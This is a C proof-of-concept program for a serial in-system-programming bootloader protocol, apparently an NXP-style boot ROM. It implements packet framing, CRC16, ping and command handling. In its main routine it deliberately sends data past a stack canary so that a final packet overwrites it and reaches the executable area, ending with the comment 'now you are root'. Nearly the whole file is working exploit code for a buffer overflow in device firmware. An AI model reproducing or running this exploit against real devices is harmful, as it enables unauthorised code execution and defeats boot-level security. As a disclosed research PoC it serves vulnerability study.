/*
 * A very minimal implementation of ISP to demonstrate a POC
 * Not robust, not production ready
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <termios.h>
#include <unistd.h>

uint8_t ping_bytes[2] = {0x5a, 0xa6};
uint8_t ping_response[10] = {0x5a, 0xa7, 0x00, 0x03, 0x01, 0x50, 0x00, 0x00,
				0xfb, 0x40};
uint8_t ack_bytes[2] = {0x5a, 0xa1};

struct framing_packet {
	uint8_t start_byte;
	uint8_t packet_type;
	uint8_t length_low;
	uint8_t length_high;
	uint8_t crc16_low;
	uint8_t crc16_high;
};

struct raw_command {
	uint8_t tag;
	uint8_t flags;
	uint8_t reserved;
	uint8_t parameter_count;
};

struct ack_packet {
	uint8_t start_byte;
	uint8_t packet_type;
};

int send_ack(int port);
int read_ack(int port);

uint8_t read_buffer[0x8000];

uint16_t crc16(uint8_t *data, int count, uint16_t start)
{
   uint16_t  crc;
   char i;

   crc = start;

   while (--count >= 0)
   {
      crc = crc ^ (uint16_t) *data++ << 8;
      i = 8;
      do
      {
         if (crc & 0x8000)
            crc = crc << 1 ^ 0x1021;
         else
            crc = crc << 1;
      } while(--i);
   }
   return crc;
}

int init_serial(int port)
{
	struct termios tty = { 0 };

	if(tcgetattr(port, &tty) != 0) {
    		printf("Error %i from tcgetattr: %s\n", errno, strerror(errno));
		exit(3);
	}

	// No parity
	tty.c_cflag &= ~PARENB;
	// One stop
	tty.c_cflag &= ~CSTOPB;
	// 8 bits
	tty.c_cflag &= ~CSIZE;
	tty.c_cflag |= CS8;

	// No flow control
	tty.c_cflag &= ~CRTSCTS;

	tty.c_cflag |= CREAD | CLOCAL; 

	tty.c_lflag &= ~ICANON;

	tty.c_lflag &= ~ECHO; // Disable echo
	tty.c_lflag &= ~ECHOE; // Disable erasure
	tty.c_lflag &= ~ECHONL; // Disable new-line echo
	tty.c_lflag &= ~ISIG; 

	tty.c_iflag &= ~(IXON | IXOFF | IXANY);
	tty.c_iflag &= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL);
	tty.c_oflag &= ~OPOST;
	tty.c_oflag &= ~ONLCR;

	tty.c_cc[VTIME] = 10;    // Wait for up to 1s (10 deciseconds), returning as soon as any data is received.
	tty.c_cc[VMIN] = 0;

	// hard code to 57600 for now
	cfsetispeed(&tty, B57600);
	cfsetospeed(&tty, B57600);

	if (tcsetattr(port, TCSANOW, &tty) != 0) {
    		printf("Error %i from tcsetattr: %s\n", errno, strerror(errno));
		exit(4);
	}

	return 0;
}

int do_ping(int port) {
	uint8_t	response[10] = { 0 };
	int n;

	n = write(port, ping_bytes, sizeof(ping_bytes));
	
	if (n < 0) {
		printf("Error writing: %s", strerror(errno));
		exit(1);
	}
	
	n = read(port, &response, sizeof(ping_response));

	if (n < 0) {
		printf("Error reading: %s", strerror(errno));
		exit(5);
	}

	for (int i = 0; i < sizeof(ping_response); i++) {
		if (response[i] != ping_response[i]) {
			printf("ping failed %d %x %x\n", i, response[i], ping_response[i]);
			exit(1);
		}
	}

	return 0;
}

int send_data_packet(int port, uint8_t *data, int len, bool ack)
{
	struct framing_packet frame = { 0 };
	uint16_t digest = 0;
	int ret;

	frame.start_byte = 0x5a;
	// Command packet
	frame.packet_type = 0xa5;
	frame.length_low = (uint8_t) (len & 0xff);
	frame.length_high = (uint8_t) ((len >> 8) & 0xff);

	digest = crc16((uint8_t *)&frame, 4, 0x0);
	digest = crc16(data, len, digest);

	frame.crc16_low = (uint8_t)(digest & 0xff);
	frame.crc16_high = (uint8_t)((digest >> 8) & 0xff);

	ret = write(port, &frame, sizeof(frame));

	if (ret != sizeof(frame)) {
		printf("Failed to write the frame");
		exit(3);
	}

	ret = write(port, data, len);
	fsync(port);
	if (ret != len) {
		printf("Failed to write the data");
		exit(5);
	}	

	if (ack)
		read_ack(port);
	return 0;
}

int send_command(int port, uint8_t command, uint32_t *args, int arg_cnt) {
	struct framing_packet frame = { 0 };
	struct raw_command command_pkt = { 0 };
	uint16_t len = (uint16_t)(4 + arg_cnt *4);
	uint16_t crc_start, digest;
	int i;

	frame.start_byte = 0x5a;
	// Command packet
	frame.packet_type = 0xa4;
	frame.length_low = (uint8_t) (len & 0xff);
	frame.length_high = (uint8_t) ((len >> 8) & 0xff);

	command_pkt.tag = command;
	command_pkt.parameter_count = arg_cnt;
	
	crc_start = crc16((uint8_t *)&frame, 4, 0x0);
	digest = crc16((uint8_t *)&command_pkt, 4, crc_start);
	
	for (i = 0; i < arg_cnt; i++) {
		digest = crc16((uint8_t *)&args[i], 4, digest);
	}
	
	frame.crc16_low = (uint8_t)(digest & 0xff);
	frame.crc16_high = (uint8_t)((digest >> 8) & 0xff);

	write(port, &frame, sizeof(frame));
	write(port, &command_pkt, sizeof(command_pkt));

	for (i = 0; i < arg_cnt; i++) {
		write(port, &args[i], 4);
	}

	fsync(port);
	read_ack(port);
	return 0;
}

int read_response(int port, uint8_t response_type) {
	struct framing_packet frame = { 0 };
	struct raw_command command_pkt = { 0 };
	int ret, length, cnt, return_val;

	ret = read(port, &frame, sizeof(frame));

	if (ret < 0) {
		printf("bad read\n");
		exit(3);
	}

	if (frame.packet_type != 0xa4) {
		printf("Unexpected packet %x\n", frame.packet_type);
		int i;
		for (i = 0; i < sizeof(frame); i++) {
			printf("%x ", ((uint8_t *)&frame)[i]);
		}
		exit(4);
	}

	length = frame.length_low | (frame.length_high << 8);

	cnt = 0;

	ret = read(port, &command_pkt, sizeof(command_pkt));
	if (ret < 0) {
		printf("bad read\n");
		exit(5);
	}

	ret = read(port, &return_val, sizeof(return_val));

	send_ack(port);

	if (ret < 0) {
		printf("bad read\n");
		exit(6);
	}

	if (return_val != 0) {
		printf("ISP returned error %x\n", return_val);
		exit(7);
	}
	return 0;
}

int send_ack(int port) {
	write(port, &ack_bytes, sizeof(ack_bytes));
	fsync(port);
}

int read_ack(int port) {
	struct ack_packet packet = { 0 };
	int ret;
	int timeout = 0;

tryagain:
	ret = read(port, &packet, sizeof(packet));
	if (ret < 0) {
		printf("bad read\n");
		exit(2);
	}

	if (packet.packet_type == 0xa3) {
		printf("bad ack\n");
		read_response(port, (uint8_t)0xa0);
		exit(3);
	}

	if (packet.packet_type != 0xa1) {
		// Not sure why sometimes it takes a bit to read?
		if (timeout < 10) {
			timeout += 1;
			goto tryagain;
		} else {
			printf("Hmm could not ack?");
			exit(5);
		}
	}
	return 0;
}

int send_data(int port, uint8_t *data, int len) {
	int cnt = 0;

	while (cnt < len) {
		int data_bytes;

		if (len < cnt + 512) {
			data_bytes = len - cnt;
		} else {
			data_bytes = 512;
		}

		send_data_packet(port, &data[cnt], data_bytes, true);
		
		cnt += 512;
	}

	return 0;
}

int main(int argc, char **argv) {
	int port, in_fd, size, ret;
        struct stat st;
	uint32_t args[3];

	if (argc < 3) {
		printf("Usage: %s <port> <file>\n", argv[0]);
		exit(1);
	}

	port = open(argv[1], O_RDWR);

	if (port < 0) {
		printf("serial port open failed");
		exit(2);
	}

	in_fd = open(argv[2], O_RDONLY);

	if (in_fd < 0) {
		printf("binary read failed");
		exit(2);
	}

	fstat(in_fd, &st);
        size = st.st_size;

	ret = read(in_fd, &read_buffer, size);

	if (ret < 0) {
		printf("failed to read");
		exit(1);
	}

	do_ping(port);

	// Pass the size of our file
	args[0] = size;


	// 0x8 = The receive SB file
	send_command(port,  0x8, args, 1);

	// Read our standard response
	read_response(port, (uint8_t)0xa0);

	// send everything up to our stack canary
	send_data(port, read_buffer, 0x43d0);

	// send the last packet which will overwrite the canary
	// but get us just close enough to the executable area
	send_data_packet(port, &read_buffer[0x43d0], 512, false);

	printf("printf(\"now you are root\")\n");
	// and now you are root
}

